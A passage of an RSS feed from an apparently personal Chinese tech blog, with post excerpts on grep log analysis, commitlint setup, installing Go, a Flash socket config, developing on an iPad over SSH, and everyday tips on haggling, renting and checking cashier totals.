&lt;p&gt;**&lt;!-- raw HTML omitted --&gt;**只要有价格，就可以讲价。**但是也有例外，例如超市，超市的东西明码标价。售货员一般不会管价格。&lt;/p&gt;
&lt;h1 id=&#34;其次要和能管价的人谈&#34;&gt;&lt;strong&gt;其次，要和能管价的人谈&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;**&lt;!-- raw HTML omitted --&gt;&lt;strong&gt;其次，要和能管价的人谈。&lt;/strong&gt; 有些人不管价格，讲多少都没用。&lt;/p&gt;
&lt;h1 id=&#34;50理论&#34;&gt;50%理论&lt;/h1&gt;
&lt;p&gt;第一次喊价以后，一般只会抬价，而不会降价，所以务必要重视。&lt;/p&gt;
&lt;p&gt;例如一束花，店家要价80，实际这束花成本20。如果你第一喊价70，那你只能优惠小于10元。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一次喊价要低于心理价位，这样才有留够上涨的空间&lt;/li&gt;
&lt;li&gt;**50%理论 ，**一般你的第一次出价可以按照卖家要价的50%开始喊价。然后再利用各种计策。提高价格，这里最重要的是摸出买家的底价，高于这个低价，买家才会卖。80元的花，你的第一次出价可以喊40元。&lt;/li&gt;
&lt;li&gt;脸皮要厚，脸皮厚，才能要更多优惠&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>[todo]锋利的linux日志分析命令</title>
      <link>https://wdd.js.org/posts/2020/04/qlqhiv/</link>
      <pubDate>Sun, 04 Oct 2020 10:13:10 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/04/qlqhiv/</guid>
      <description>&lt;h1 id=&#34;预处理&#34;&gt;预处理&lt;/h1&gt;
&lt;h2 id=&#34;从一个文件中过滤&#34;&gt;从一个文件中过滤&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;grep key file&lt;/code&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;➜ grep ERROR a.log 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;12:12 ERROR:core bad message
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;从多个文件中过滤&#34;&gt;从多个文件中过滤&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;grep key file1 fil2&lt;/code&gt; 多文件搜索，指定多个文件&lt;/li&gt;
&lt;li&gt;&lt;code&gt;grep key *.log&lt;/code&gt;  使用正则的方式，匹配多个文件&lt;/li&gt;
&lt;li&gt;&lt;code&gt;grep -h key *.log&lt;/code&gt; 可以使用-h, 让结果中不出现文件名。默认文件名会出现在匹配行的前面。&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;➜ grep ERROR a.log b.log 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a.log:12:12 ERROR:core bad message
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;b.log:13:12 ERROR:core bad message
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;➜ grep ERROR *.log
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a.log:12:12 ERROR:core bad message
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;b.log:13:12 ERROR:core bad message
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;多个关键词过滤&#34;&gt;多个关键词过滤&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;grep -e key1 -e key2 file&lt;/code&gt; 使用-e参数，可以制定多个关键词&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;➜ grep -e ERROR -e INFO a.log 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;12:12 ERROR:core bad message
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;12:12 INFO:parse bad message1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;正则过滤&#34;&gt;正则过滤&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;grep -E REG file&lt;/code&gt;  下面例子是匹配db:后跟数字部分&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;➜ grep -E &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db:\d+ &amp;#34;&lt;/span&gt; a.log
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;12:14 WARNING:db:1 bad message
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;12:14 WARNING:db:21 bad message
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;12:14 WARNING:db:2 bad message1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;12:14 WARNING:db:4 bad message
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;仅输出匹配字段&#34;&gt;仅输出匹配字段&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;grep -o args&lt;/code&gt; 使用-o参数，可以仅仅输出匹配项，而不是整个匹配的行&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;➜  go-tour grep -o -E &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db:\d+ &amp;#34;&lt;/span&gt; a.log
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;db:1 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;db:21 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;db:2 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;db:4 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;统计关键词出现的行数&#34;&gt;统计关键词出现的行数&lt;/h2&gt;
&lt;p&gt;例如一个nginx的access.log, 我们想统计其中的POST的个数，和OPTIONS的个数。&lt;/p&gt;</description>
    </item>
    <item>
      <title>flash_player_admin_guide</title>
      <link>https://wdd.js.org/posts/2020/09/thg9yu/</link>
      <pubDate>Wed, 23 Sep 2020 16:28:06 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/09/thg9yu/</guid>
      <description>&lt;p&gt;虽然flash已经几乎被淘汰了，但是在某些老版本的IE里面，依然有他们顽强的身影。&lt;/p&gt;
&lt;p&gt;使用flash 模拟websocket, 有时会遇到下面的问题。虽然flash安全策略文件已经部署，但是客户端依然报错。&lt;/p&gt;
&lt;p&gt;[WebSocket] cannot connect to Web Socket Server at &amp;hellip; make sure the server is runing and Flash policy file is correct placed.&lt;/p&gt;
&lt;p&gt;解决方案：&lt;/p&gt;
&lt;p&gt;在**%WINDIR%\System32\Macromed\Flash**下创建一个名为mms.cfg的文件, 如果文件已经存在，则不用创建。&lt;/p&gt;
&lt;p&gt;文件内容如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;DisableSockets&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://www.yuque.com/attachments/yuque/0/2020/pdf/280451/1600849762923-f66702f2-a7f1-4951-b746-fc0666c2d1cf.pdf&#34;&gt;flash_player_admin_guide.pdf&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>使用commitlint检查git提交信息是否合规</title>
      <link>https://wdd.js.org/posts/2020/09/vu0ag0/</link>
      <pubDate>Wed, 23 Sep 2020 09:29:01 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/09/vu0ag0/</guid>
      <description>&lt;p&gt;建议先看下前提知识：&lt;a href=&#34;https://www.ruanyifeng.com/blog/2016/01/commit_message_change_log.html&#34;&gt;https://www.ruanyifeng.com/blog/2016/01/commit_message_change_log.html&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;提交信息规范&#34;&gt;提交信息规范&lt;/h1&gt;
&lt;p&gt;通用类型的头字段&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;build 构建&lt;/li&gt;
&lt;li&gt;ci 持续继承工具&lt;/li&gt;
&lt;li&gt;chore 构建过程或辅助工具的变动&lt;/li&gt;
&lt;li&gt;docs 文档（documentation）&lt;/li&gt;
&lt;li&gt;feat 新功能（feature）&lt;/li&gt;
&lt;li&gt;fix 修补bug&lt;/li&gt;
&lt;li&gt;perf 性能优化&lt;/li&gt;
&lt;li&gt;refactor 重构（即不是新增功能，也不是修改bug的代码变动）&lt;/li&gt;
&lt;li&gt;revert&lt;/li&gt;
&lt;li&gt;style 格式（不影响代码运行的变动）&lt;/li&gt;
&lt;li&gt;test 增加测试&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git commit -m &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fix: xxxxxx&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git commit -m &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;feat: xxxxxx&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;安装&#34;&gt;安装&lt;/h1&gt;
&lt;h2 id=&#34;安装依赖&#34;&gt;安装依赖&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yarn add -D @commitlint/config-conventional @commitlint/cli husky
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;修改packagejson&#34;&gt;修改package.json&lt;/h2&gt;
&lt;p&gt;在package.json中加入&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;husky&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hooks&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;commit-msg&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;commitlint -E HUSKY_GIT_PARAMS&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;新增配置&#34;&gt;新增配置&lt;/h2&gt;
&lt;p&gt;文件名：commitlint.config.js&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;module.exports &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;extends: &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;@commitlint/config-conventional&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;测试&#34;&gt;测试&lt;/h1&gt;
&lt;p&gt;如果你的提交不符合规范，提交将会失败。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;➜  git commit -am &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;00&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;warning ../package.json: No license field
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;husky &amp;gt; commit-msg &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;node v12.18.3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;⧗   input: &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;✖   subject may not be empty &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;subject-empty&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;✖   type may not be empty &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;type-empty&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;✖   found &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; problems, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; warnings
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ⓘ   Get help: https://github.com/conventional-changelog/commitlint/#what-is-commitlint
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;根据commitlog生成changelog&#34;&gt;根据commitlog生成changelog&lt;/h1&gt;
&lt;p&gt;下面命令中的1.5.5 1.5.10可以是两个tag, 也可以是两个分支。&lt;/p&gt;</description>
    </item>
    <item>
      <title>Golang初学者的问题</title>
      <link>https://wdd.js.org/golang/golang-start-faq/</link>
      <pubDate>Fri, 18 Sep 2020 21:22:25 +0800</pubDate>
      <guid>https://wdd.js.org/golang/golang-start-faq/</guid>
      <description>&lt;h1 id=&#34;1-如何安装go&#34;&gt;1. 如何安装go&lt;/h1&gt;
&lt;p&gt;本次安装环境是win10子系统 ubuntu 20.04&lt;/p&gt;
&lt;p&gt;打开网站 &lt;a href=&#34;https://golang.google.cn/dl/&#34;&gt;https://golang.google.cn/dl/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;选择合适的最新版的连接&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cd
mkdir download
cd download
wget https://golang.google.cn/dl/go1.16.3.linux-amd64.tar.gz
tar -C /usr/local -xvf go1.16.3.linux-amd64.tar.gz

因为我用的是zsh
所以我在~/.zshrc中，将go的bin目录加入到PATH中
export PATH=$PATH:/usr/local/go/bin

保存.zshrc之后
source ~/.zshrc


➜  download go version
go version go1.16.3 linux/amd64
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;2-go-proxy设置&#34;&gt;2. go proxy设置&lt;/h1&gt;
&lt;p&gt;Go 1.13 及以上（推荐）&lt;/p&gt;
&lt;p&gt;打开你的终端并执行&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;go env -w GO111MODULE=on
go env -w GOPROXY=https://goproxy.cn,direct
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;3-go-get-下载的文件在哪&#34;&gt;3. go get 下载的文件在哪？&lt;/h1&gt;
&lt;p&gt;检查 go env&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;GOPATH=&amp;#34;/Users/wangdd/go”
/Users/wangdd/go/pkg/mod
total 0
drwxr-xr-x  4 wangdd  staff   128B Sep 14 09:17 cache
drwxr-xr-x  8 wangdd  staff   256B Sep 14 09:17 github.com
drwxr-xr-x  3 wangdd  staff    96B Sep 14 09:17 golang.org
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;路径在GOPATH/pkg/mod 目录下&lt;/p&gt;</description>
    </item>
    <item>
      <title>租房的检查清单</title>
      <link>https://wdd.js.org/posts/2020/09/xglwgs/</link>
      <pubDate>Wed, 16 Sep 2020 20:57:40 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/09/xglwgs/</guid>
      <description>&lt;p&gt;在上海工作的人，除了一年一次的春运，就可能是就是一年一次的找房搬家了。&lt;/p&gt;
&lt;p&gt;找房彷佛就是一趟西天取经，要经历九九八十一难，也要个各种妖魔鬼怪斗智斗勇。这其中难处，暂且不表。重点介绍你应当如何去按照一定的方案来检查各种设施的功能。&lt;/p&gt;
&lt;p&gt;要知道，世事多变，你现下找的房子如果很不错，即使后期突然需要转租，也是比较容易转租的。否则房子转租不出去，自己也白白赔了押金。&lt;/p&gt;
&lt;p&gt;重点检查&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;洗衣机&lt;/li&gt;
&lt;li&gt;空调&lt;/li&gt;
&lt;li&gt;冰箱&lt;/li&gt;
&lt;li&gt;抽油烟机&lt;/li&gt;
&lt;li&gt;马桶&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;上面这些设备，不要斤斤打眼看看外表正不正常，更要尽可能去试试。比如说马桶，即使能无法坐在上面上个厕所，你也要用手按一下，看看冲水是否正常。 交钱之前你是二房东大爷，交完钱签好合同，二房东就是你大爷了。马桶要是不好用，浪费水不说，还影响心情。到时候你找你大爷来修，你大爷就不一定有时间了。你大爷一般包了几百套房子，怎么会管你的小问题呢。&lt;/p&gt;
&lt;p&gt;总之呢，你要有自己的一个检查清单项目，要检查哪些，如何检查，务必做到切实可行。&lt;/p&gt;
&lt;p&gt;有的时候，房子有些问题，房东和中介故意顾左右而言他，你切不可被他们玩的团团转。一定要按照既定的方案实施检查。&lt;/p&gt;
&lt;p&gt;另外就是签合同了，违约金这块要注意的。有的中介和二房东狼狈为奸，除了要不退押金，还要有额外的赔钱项。这点务必要注意。正常来处，如果转租不出去，你有确定要退房，一般只有不退押金，没有其他的赔钱项。这点要在租房合同上写清楚。&lt;/p&gt;
&lt;p&gt;凡是没有黑纸白纸写清楚的，你都可以认为是中介和二房东在忽悠。&lt;/p&gt;</description>
    </item>
    <item>
      <title>如何避免被收银员坑</title>
      <link>https://wdd.js.org/posts/2020/09/hpc6fy/</link>
      <pubDate>Wed, 16 Sep 2020 19:16:58 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/09/hpc6fy/</guid>
      <description>&lt;p&gt;大部分人结账付钱的时候，都不怎么关注。很多次被收银员褥羊毛了也毫不察觉。&lt;/p&gt;
&lt;p&gt;场景1:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;你去买水果，看到苹果比较新鲜，价格8元/每斤，但是收银员称重计费的时候，是按照12元/每斤计算的。但是当时你在打开支付宝准备付钱，没有注意称上的单价。付费过后，收银员没给你小票。你也没注意，事情就这么过去了。
如果你对收银员按的单价表示怀疑，问了句：这苹果怎么和标价上不一致？ 收银员尴尬的笑了笑，说到：不好意思，我按错了。比较老练的可能会说：不好意思，我还以为你拿的是旁边的那种水果呢？&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;场景2:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;你和朋友一起去吃烤鱼，点了一条清江鱼，服务员称重过后，在菜单上用铅笔写了3.5斤。酒足饭饱之后，你去结账。收银员开出小票，上面写的清江鱼 4.2斤，你也没注意。甚至有可能那个铅笔写的斤数已经被酒水的污渍涂抹的不清楚了。如果有表示怀疑，仔细看了看小票，说鱼的重量不对。收银员又尴尬的笑了笑，说到：不好意思，这个可能记得别的桌的鱼的重量的。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;场景3:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;你买了一包垃圾袋7元，一包衣服撑18，一个垃圾桶6，五金店的老板也没用计算机，抬头望着天空的那朵白云。彷佛再做云计算，然后说：一共38块。&lt;/p&gt;
&lt;p&gt;shit! 很多人真的就直接掏钱了。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;你看看，收银员说的不好意思多值钱，简直是一字千金啊！但是更多时候，我们都是稀里糊涂的蒙在鼓里。&lt;/p&gt;
&lt;p&gt;要想不被辱羊毛，务必要谨记。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;商品的标价要谨记于心&lt;/li&gt;
&lt;li&gt;不要相信收银员的信口开河的算钱，要自己算&lt;/li&gt;
&lt;li&gt;买完东西，一定要问收银员要小票&lt;/li&gt;
&lt;li&gt;收银员称重的时候，要注意观察称上显示的价格和摆货区的价格是否一致&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    <item>
      <title>IO性能 Ｎode vs PHP vs Java vs Go</title>
      <link>https://wdd.js.org/posts/2020/09/upi47f/</link>
      <pubDate>Mon, 14 Sep 2020 16:43:06 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/09/upi47f/</guid>
      <description>&lt;h1 id=&#34;system-calls&#34;&gt;System Calls&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;应用程序工作在用户模式&lt;/li&gt;
&lt;li&gt;应用程序不能直接访问硬件资源，应用程序需要调用操作系统提供的接口间接访问。这个叫做系统调用。一般的系统调用都是阻塞的。阻塞的意思就是你在网上买了个苹果，在你收到这个快递之前，你啥也不干，就躺在床上等着。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;非阻塞&#34;&gt;非阻塞&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;非阻塞的程序，在系统调用时，会立即返回一个标shi&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>使用iPad开发折腾记</title>
      <link>https://wdd.js.org/posts/2020/09/rzumhc/</link>
      <pubDate>Tue, 08 Sep 2020 20:37:52 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/09/rzumhc/</guid>
      <description>&lt;h1 id=&#34;为什么要用ipad开发&#34;&gt;为什么要用iPad开发？&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;第一，我不想再买台电脑或者笔记本放在家里。因为我也不用电脑来打游戏。而且无论台式机还是笔记本都比较占地方。搬家也费劲。&lt;/li&gt;
&lt;li&gt;第二，我只有一台MacBook Pro，以前下班也会背着，因为总有些事情需要做。但是自从有一天觉得肩膀不舒服了，我就决定不再背电脑。廉颇老矣，腰酸背痛。&lt;/li&gt;
&lt;li&gt;虽然不再背电脑，但是偶有雅兴，心血来潮，我还需要写点博客或者代码的。&lt;/li&gt;
&lt;li&gt;所以我买了台iPad来开发或者写博客。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;前期准备工作&#34;&gt;前期准备工作&lt;/h1&gt;
&lt;h2 id=&#34;硬件准备&#34;&gt;硬件准备&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;一台iPad&lt;/li&gt;
&lt;li&gt;一个蓝牙键盘。最好买那种适合笔记本的蓝牙键盘，千万不要买可折叠的蓝牙键盘，因为用着不舒服&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;软件准备&#34;&gt;软件准备&lt;/h2&gt;
&lt;p&gt;常规的功能，例如写文字，写博客，一个浏览器足以胜任。唯一的难点在于如何编程。&lt;/p&gt;
&lt;p&gt;目前来说，有两个方案：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;方案1: 使用在线编辑器。例如码云，github, codepen等网站，都是提供在线编辑器的。优点是方便，免费。缺点也很明显，无法调试或者运行代码。&lt;/li&gt;
&lt;li&gt;方案2: 购买云主机，iPad上安装Termius, ssh远程连接到服务端，在真正的操作系统中做开发。优点是比较自由，扩展性强。缺点是需要花钱，而且在没有IDE环境做开发是有不小的难度的。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;方案1由于比较简单，就不赘述了。&lt;/p&gt;
&lt;p&gt;着重讲讲方案2:&lt;/p&gt;
&lt;h1 id=&#34;购买云主机&#34;&gt;购买云主机&lt;/h1&gt;
&lt;p&gt;一般来说，即使是最低配置的主机，一年的费用也至少要几百块。但是也有例外情况。我的目标是找那些年费在一百块以内的云主机。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;针对大学生的优惠。一般大学生可以以几十块的价钱买到最低配的云主机。&lt;/li&gt;
&lt;li&gt;针对新用户的优惠。新用户的优惠力度还是很大的。一般用过一年之后，我就会转站其他云服务提供商。所以国内的好多朵公有云，基本上我都上过。唯一没上过的就是筋斗云。&lt;/li&gt;
&lt;li&gt;特殊优惠日。一般来说，一年之内，至少存在两个优惠日，双十一和六一八。在这两个时间点，一般可以买到比较优惠的云主机。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;开发环境搭建&#34;&gt;开发环境搭建&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;使用Terminue连接到远程服务器上。注意最好在公有云上使用公钥登录，并禁止掉密码登录。最好再安装个fail2ban。因为每个云主机基本上每天都有很多恶意的登录尝试。&lt;/li&gt;
&lt;li&gt;需要安装oh-my-zsh.  最好用的sh, 不解释。&lt;/li&gt;
&lt;li&gt;作为开发环境，一个屏幕肯定是不够的，所以你需要tmux.&lt;/li&gt;
